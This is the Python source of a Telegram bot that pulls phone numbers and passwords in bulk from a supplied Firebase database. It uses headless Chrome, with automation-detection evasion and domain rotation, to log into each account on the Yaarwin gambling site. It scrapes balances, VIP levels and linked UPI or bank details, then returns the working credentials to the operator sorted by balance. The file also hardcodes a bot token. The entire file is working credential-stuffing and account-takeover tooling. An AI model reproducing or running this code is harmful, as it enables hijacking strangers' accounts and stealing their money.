#!/usr/bin/env python3
"""Yaarwin Bot - ULTIMATE HIGH SPEED & SMART PARSE"""
import os
import sys
import time
import logging
import requests
import re
import gc
import json
from datetime import datetime, date
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException

BOT_TOKEN = os.getenv("BOT_TOKEN", "8828323902:AAEumblFpZJyq2EkxzuVBe3JIP-HleVwK0c")
PORT = int(os.environ.get("PORT", 10000))
STOP_NOW = False

OFFICIAL_DOMAINS = [
    "yaarwin.click",
    "yaarwin.club",
    "yaarwin.net",
    "yaarwin.org",
    "yaarwin.sbs",
    "yaarwin.xyz",
]

DOMAIN_INDEX = 0
VIP_REQUIREMENTS = {0: 0, 1: 3000, 2: 30000, 3: 200000, 4: 2000000, 5: 20000000}

USER_DATA_FILE = "yaarwin_user_data.json"
SUCCESS_HISTORY_FILE = "yaarwin_success_history.json"

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)


def get_current_domain():
    global DOMAIN_INDEX
    return OFFICIAL_DOMAINS[DOMAIN_INDEX % len(OFFICIAL_DOMAINS)]


def switch_domain():
    global DOMAIN_INDEX
    old_domain = get_current_domain()
    DOMAIN_INDEX = (DOMAIN_INDEX + 1) % len(OFFICIAL_DOMAINS)
    new_domain = get_current_domain()
    logger.info("Domain switched: " + old_domain + " -> " + new_domain)
    return new_domain


def test_domain(domain):
    try:
        resp = requests.get("https://" + domain, timeout=3, allow_redirects=True)
        return resp.status_code == 200
    except:
        return False


def find_working_domain():
    global DOMAIN_INDEX
    for i in range(len(OFFICIAL_DOMAINS)):
        idx = (DOMAIN_INDEX + i) % len(OFFICIAL_DOMAINS)
        domain = OFFICIAL_DOMAINS[idx]
        if test_domain(domain):
            DOMAIN_INDEX = idx
            logger.info("Working domain found: " + domain)
            return domain
    return get_current_domain()


def get_base_url():
    return "https://" + get_current_domain()


def get_login_url():
    return get_base_url() + "/#/login"


def get_main_url():
    return get_base_url() + "/#/main"


def get_vip_url():
    return get_base_url() + "/#/vip"


def get_first_deposit_url():
    return get_base_url() + "/#/activity/FirstRecharge"


def get_withdraw_url():
    return get_base_url() + "/#/withdraw"


def load_user_data():
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return {}


def save_user_data(data):
    try:
        with open(USER_DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass


def get_user_data(user_id):
    all_data = load_user_data()
    user_id_str = str(user_id)
    if user_id_str not in all_data:
        all_data[user_id_str] = {"firebase_url": None, "skip_count": 0}
        save_user_data(all_data)
    return all_data[user_id_str]


def set_user_data(user_id, key, value):
    all_data = load_user_data()
    user_id_str = str(user_id)
    if user_id_str not in all_data:
        all_data[user_id_str] = {"firebase_url": None, "skip_count": 0}
    all_data[user_id_str][key] = value
    save_user_data(all_data)


def load_success_history():
    try:
        if os.path.exists(SUCCESS_HISTORY_FILE):
            with open(SUCCESS_HISTORY_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return {}


def save_success_history(data):
    try:
        with open(SUCCESS_HISTORY_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass


def add_success(user_id, result):
    history = load_success_history()
    user_id_str = str(user_id)
    if user_id_str not in history:
        history[user_id_str] = []
    result_copy = dict(result)
    result_copy["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
    result_copy["time"] = time.strftime("%I:%M %p")
    result_copy["date"] = time.strftime("%Y-%m-%d")
    history[user_id_str].append(result_copy)
    save_success_history(history)


def get_user_success(user_id):
    history = load_success_history()
    user_id_str = str(user_id)
    return history.get(user_id_str, [])


def get_user_success_by_date(user_id, target_date):
    all_success = get_user_success(user_id)
    if target_date.lower() == "today":
        target_date = time.strftime("%Y-%m-%d")
    return [s for s in all_success if s.get("date", "") == target_date]


def clear_user_success(user_id):
    history = load_success_history()
    user_id_str = str(user_id)
    if user_id_str in history:
        history[user_id_str] = []
        save_success_history(history)


def fetch_firebase(url):
    try:
        if not url.endswith(".json"):
            url = url.rstrip("/") + "/.json"

        all_data = {}
        last_key = None
        batch = 0

        while True:
            batch += 1
            if last_key:
                query_url = url + '?orderBy="$key"&limitToFirst=100&startAfter="' + str(last_key) + '"'
            else:
                query_url = url + '?orderBy="$key"&limitToFirst=100'

            resp = requests.get(query_url, timeout=60)
            if resp.status_code != 200:
                break

            data = resp.json()
            if not data:
                break

            all_data.update(data)
            if len(data) < 100:
                break

            last_key = list(data.keys())[-1]
        
        extracted_users = []
        
        def smart_extract(obj):
            if isinstance(obj, dict):
                pwd = (
                    obj.get("password") or obj.get("pass") or obj.get("pwd") 
                    or obj.get("passWord") or obj.get("loginPassword") or obj.get("Pass")
                )
                
                phone = (
                    obj.get("phone") or obj.get("number") or obj.get("mobile") 
                    or obj.get("userNumber") or obj.get("username") or obj.get("phonenumber")
                    or obj.get("Num") or obj.get("num")
                )
                
                if not phone:
                    for k, v in obj.items():
                        if isinstance(v, dict):
                            sub_pwd = v.get("password") or v.get("pass") or v.get("pwd") or v.get("Pass")
                            if sub_pwd:
                                clean_k = str(k).strip()
                                if clean_k.isdigit() and len(clean_k) >= 10:
                                    extracted_users.append({"phone": clean_k, "password": str(sub_pwd).strip()})
                        elif k.lower() in ["password", "pass", "pwd"] and isinstance(v, str):
                            pwd = v

                if phone and pwd:
                    extracted_users.append({"phone": str(phone).strip(), "password": str(pwd).strip()})
                else:
                    for k, v in obj.items():
                        if isinstance(v, (dict, list)):
                            smart_extract(v)
            elif isinstance(obj, list):
                for item in obj:
                    if isinstance(item, (dict, list)):
                        smart_extract(item)

        smart_extract(all_data)
        
        unique_users = {}
        for u in extracted_users:
            unique_users[u["phone"]] = u
            
        final_list = list(unique_users.values())
        return final_list if final_list else None

    except Exception as e:
        logger.error("Firebase error: " + str(e))
        return None


def parse_balance(balance_str):
    try:
        clean = balance_str.replace("₹", "").replace(",", "").strip()
        return float(clean)
    except:
        return 0.0


class GameBot:
    def __init__(self, phone, password):
        self.phone = phone
        self.password = password
        self.driver = None
        self.wallet = "N/A"
        self.vip_level = "0"
        self.vip_bet_progress = ""
        self.vip_level_up_rewards = []
        self.first_deposit = []
        self.upi_status = "Not Added"
        self.bank_status = "Not Added"
        self.success = False
        self.reason = ""
        self.arwallet = "N/A"
        self.safe_balance = "N/A"
        self.withdrawable = "N/A"
        self.total_exp = "0"
        self.payout_days = "0"
        self.vip_status = ""
        self.current_domain = get_current_domain()
        self.domain_switched = False

    def setup(self):
        try:
            opts = Options()
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--headless=new")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_argument("--window-size=375,812")
            opts.add_argument("--user-agent=Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36")
            opts.add_argument("--disable-extensions")
            opts.add_argument("--disable-plugins")
            opts.add_argument("--disable-images")
            opts.add_argument("--blink-settings=imagesEnabled=false")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            opts.add_argument("--single-process")

            driver = webdriver.Chrome(options=opts)
            self.driver = driver
            self.driver.set_page_load_timeout(15)  # Fast timeout
            self.driver.implicitly_wait(1)        # Fast implicit wait
            self.driver.set_script_timeout(10)
            return True
        except Exception as e:
            self.reason = "Chrome error: " + str(e)[:60]
            return False

    def check_stop(self):
        global STOP_NOW
        return STOP_NOW

    def wait_for_element(self, by, value, timeout=2):
        try:
            return WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
        except:
            return None

    def get_page_text(self):
        try:
            return self.driver.find_element(By.TAG_NAME, "body").text
        except:
            return ""

    def get_page_source(self):
        try:
            return self.driver.page_source
        except:
            return ""

    def is_login_error(self, page_text):
        lower_text = page_text.lower()
        error_patterns = [
            "wrong account or password", "error: 147", "user has been locked",
            "error: 116", "account locked", "user locked", "account has been locked",
            "user has been disabled", "account disabled", "wrong password",
            "incorrect password", "invalid credentials", "login failed"
        ]
        for pattern in error_patterns:
            if pattern in lower_text:
                return True
        return False

    def get_login_error_reason(self, page_text):
        lower_text = page_text.lower()
        if "user has been locked" in lower_text or "error: 116" in lower_text or "account locked" in lower_text:
            return "User has been locked - SKIP"
        if "wrong account or password" in lower_text or "error: 147" in lower_text or "wrong password" in lower_text:
            return "Wrong account or password - SKIP"
        if "user has been disabled" in lower_text or "account disabled" in lower_text:
            return "Account disabled - SKIP"
        return "Login failed"

    def try_with_domain_switch(self, url_func, wait=0.3, max_switches=2):
        global DOMAIN_INDEX
        original_domain = get_current_domain()
        switches = 0

        while switches < max_switches:
            url = url_func()
            try:
                self.driver.get(url)
                if wait > 0:
                    time.sleep(wait)
                return True, None
            except TimeoutException:
                return True, None
            except Exception as e:
                error_msg = str(e)[:40]
                if any(err in error_msg.lower() for err in ["net::", "err_", "dns", "connection", "refused", "unreachable"]):
                    switches += 1
                    if switches < max_switches:
                        new_domain = switch_domain()
                        self.domain_switched = True
                        self.current_domain = new_domain
                        time.sleep(1)
                        continue
                return False, error_msg

        return False, "All domains failed"

    def fast_login(self):
        global STOP_NOW
        try:
            if self.check_stop():
                self.reason = "Stopped"
                return False

            success, error = self.try_with_domain_switch(get_login_url, 0.4)
            if not success:
                self.reason = error or "Page load failed"
                return False

            time.sleep(0.4)

            phone_in = None
            for sel in ['input[name="userNumber"]', 'input[type="tel"]', "input.van-field__control"]:
                try:
                    phone_in = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=1.5)
                    if phone_in and phone_in.is_displayed():
                        break
                except:
                    continue

            if not phone_in:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    try:
                        if inp.is_displayed() and inp.get_attribute("type") != "password":
                            phone_in = inp
                            break
                    except:
                        continue

            if not phone_in:
                self.reason = "Phone input not found"
                return False

            phone_in.clear()
            phone_in.send_keys(self.phone)

            pwd_in = None
            for sel in ['input[type="password"]', 'input[name="password"]']:
                try:
                    pwd_in = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=1.5)
                    if pwd_in and pwd_in.is_displayed():
                        break
                except:
                    continue

            if not pwd_in:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    try:
                        if inp.get_attribute("type") == "password":
                            pwd_in = inp
                            break
                    except:
                        continue

            if not pwd_in:
                self.reason = "Password input not found"
                return False

            pwd_in.clear()
            pwd_in.send_keys(self.password)

            btn = None
            for sel in ["button.active", "button.van-button--primary", 'button[type="submit"]']:
                try:
                    btn = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=1.5)
                    if btn:
                        break
                except:
                    continue

            if not btn:
                btns = self.driver.find_elements(By.TAG_NAME, "button")
                for b in btns:
                    try:
                        if any(w in b.text.lower() for w in ["login", "sign", "log in", "submit"]):
                            btn = b
                            break
                    except:
                        continue

            if not btn:
                self.reason = "Login button not found"
                return False

            try:
                btn.click()
            except:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                except:
                    self.reason = "Cannot click login"
                    return False

            login_success = False
            for i in range(2):
                if self.check_stop():
                    self.reason = "Stopped"
                    return False

                time.sleep(0.8)
                current_url = self.driver.current_url
                page_text = self.get_page_text()

                if self.is_login_error(page_text):
                    self.reason = self.get_login_error_reason(page_text)
                    return False

                if "login" not in current_url:
                    if any(k in page_text.lower() for k in ["balance", "wallet", "₹", "home", "main", "vip", "activity"]):
                        login_success = True
                        break

            if login_success:
                self.success = True
                return True
            else:
                page_text = self.get_page_text()
                if self.is_login_error(page_text):
                    self.reason = self.get_login_error_reason(page_text)
                    return False
                self.reason = "Login timeout"
                return False

        except Exception as e:
            self.reason = "Error: " + str(e)[:60]
            return False

    def get_all_details_real(self):
        try:
            self._extract_main_page()
            self._extract_vip_real()
            self._extract_first_deposit()
            self._extract_payment()
        except Exception as e:
            logger.error("Get details error: " + str(e))

    def _extract_main_page(self):
        try:
            success, error = self.try_with_domain_switch(get_main_url, 0.4)
            if not success:
                return
            time.sleep(0.5)
            page_text = self.get_page_text()
            lines = page_text.split("\n")

            for i, line in enumerate(lines):
                lower_line = line.lower().strip()
                if any(label in lower_line for label in ["available balance", "total balance", "wallet balance", "balance"]):
                    for j in range(i + 1, min(i + 5, len(lines))):
                        match = re.search(r"₹\s*([\d,]+\.?\d*)", lines[j].strip())
                        if match:
                            self.wallet = "₹" + match.group(1)
                            break
                    break

            if self.wallet == "N/A":
                for line in lines[:25]:
                    match = re.search(r"₹\s*([\d,]+\.?\d*)", line.strip())
                    if match:
                        try:
                            float(match.group(1).replace(",", ""))
                            self.wallet = "₹" + match.group(1)
                            break
                        except:
                            pass

            for line in lines:
                if "withdrawable" in line.lower():
                    match = re.search(r"₹\s*([\d,]+\.?\d*)", line)
                    if match:
                        self.withdrawable = "₹" + match.group(1)
                        break
        except:
            pass

    def _extract_vip_real(self):
        try:
            success, error = self.try_with_domain_switch(get_vip_url, 0.4)
            if not success:
                return
            time.sleep(0.5)
            vip_text = self.get_page_text()
            vip_lines = vip_text.split("\n")

            current_vip = "0"
            for line in vip_lines[:15]:
                vip_match = re.search(r"VIP\s*(\d+)", line, re.IGNORECASE)
                if vip_match:
                    current_vip = vip_match.group(1)
                    break

            self.vip_level = current_vip
            self.vip_status = "VIP" + str(current_vip)
        except:
            pass

    def _extract_first_deposit(self):
        try:
            success, error = self.try_with_domain_switch(get_first_deposit_url, 0.3)
            if not success:
                return
            time.sleep(0.4)
            fd_text = self.get_page_text()
            if "receive" in fd_text.lower():
                self.first_deposit.append("First Deposit Bonus Available")
        except:
            pass

    def _extract_payment(self):
        try:
            success, error = self.try_with_domain_switch(get_withdraw_url, 0.3)
            if not success:
                return
            time.sleep(0.4)
            wd_text = self.get_page_text()
            if "@" in wd_text:
                self.upi_status = "Added"
            if any(b in wd_text for b in ["Bank", "Account"]):
                self.bank_status = "Added"
        except:
            pass

    def close(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
        gc.collect()


def sort_by_balance(success_list):
    def get_balance(item):
        return parse_balance(item.get("balance", "₹0"))
    return sorted(success_list, key=get_balance, reverse=True)


def format_success_entry(s, idx=None):
    msg = ""
    if idx is not None:
        msg += "┌─────────────────────┐\n"
        msg += "│ #" + str(idx + 1) + " | " + s.get("time", "?") + "\n"
    else:
        msg += "┌─────────────────────┐\n"

    msg += (
        "│ 📱 " + s.get("phone", "N/A") + "\n"
        "│ 🔑 " + s.get("password", "N/A") + "\n"
        "│ 💰 " + s.get("balance", "N/A") + "\n"
    )
    msg += "└─────────────────────┘\n\n"
    return msg


async def send_success_list(update, success_list, title, filter_fn=None):
    if filter_fn:
        filtered = [s for s in success_list if filter_fn(s)]
    else:
        filtered = success_list

    if not filtered:
        await update.message.reply_text("📭 No records found!")
        return

    sorted_list = sort_by_balance(filtered)
    msg = title + "\n═══════════════════════\nTotal: " + str(len(sorted_list)) + " IDs\n\n"

    for idx, s in enumerate(sorted_list):
        msg += format_success_entry(s, idx)
        if (idx + 1) % 3 == 0:
            try:
                await update.message.reply_text(msg)
            except:
                pass
            msg = ""

    if msg.strip():
        try:
            await update.message.reply_text(msg)
        except:
            pass


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    current = get_current_domain()

    msg = (
        "🎮 Yaarwin Bot - HIGH SPEED v27\n"
        "🌐 Current Domain: " + current + "\n\n"
        "Commands:\n"
        "/setfirebase <url>\n"
        "/setskip <number>\n"
        "/login - Fast Start\n"
        "/stop - Stop\n"
        "/success\n"
        "/balance\n"
    )
    await update.message.reply_text(msg)


async def setfirebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setfirebase <url>")
        return
    set_user_data(user_id, "firebase_url", context.args[0])
    await update.message.reply_text("✅ Firebase Set!")


async def setskip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setskip <number>")
        return
    try:
        set_user_data(user_id, "skip_count", int(context.args[0]))
        await update.message.reply_text("✅ Skip updated!")
    except:
        await update.message.reply_text("❌ Enter valid number!")


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_NOW
    STOP_NOW = True
    await update.message.reply_text("🛑 STOPPED!")


async def success_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_success_list(update, get_user_success(update.effective_user.id), "📊 SUCCESS LIST")


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_success_list(update, get_user_success(update.effective_user.id), "💰 WITH BALANCE", lambda s: parse_balance(s.get("balance", "₹0")) > 0)


async def clearsuccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clear_user_success(update.effective_user.id)
    await update.message.reply_text("🗑️ Cleared!")


async def login_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_NOW
    STOP_NOW = False
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    firebase_url = user_data.get("firebase_url")
    skip_count = user_data.get("skip_count", 0)

    if not firebase_url:
        await update.message.reply_text("❌ Set Firebase URL first!")
        return

    await update.message.reply_text("⚡ Smart filtering & fast fetching accounts...")
    users = fetch_firebase(firebase_url)
    
    if not users:
        await update.message.reply_text("⚠️ No valid accounts with password found!")
        return

    to_process = users[skip_count:]
    await update.message.reply_text(f"🚀 Starting High-Speed Check for {len(to_process)} accounts...")

    success_list = []
    for idx, user in enumerate(to_process):
        if STOP_NOW:
            break

        phone, password = user["phone"], user["password"]
        bot = GameBot(phone, password)
        
        if bot.setup() and bot.fast_login():
            bot.get_all_details_real()
            result = {
                "type": "success",
                "phone": phone,
                "password": password,
                "balance": bot.wallet,
                "withdrawable": bot.withdrawable,
                "vip_level": bot.vip_level,
                "domain": bot.current_domain
            }
            add_success(user_id, result)
            success_list.append(result)
            try:
                await update.message.reply_text(f"✅ Success: {phone} | Bal: {bot.wallet}")
            except:
                pass
        bot.close()

    await update.message.reply_text(f"🏁 Finished! Successful logins: {len(success_list)}")


def main():
    print("🚀 Starting High-Speed Yaarwin Bot...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("setfirebase", setfirebase_cmd))
    app.add_handler(CommandHandler("setskip", setskip_cmd))
    app.add_handler(CommandHandler("login", login_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("success", success_cmd))
    app.add_handler(CommandHandler("balance", balance_cmd))
    app.add_handler(CommandHandler("clearsuccess", clearsuccess_cmd))
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
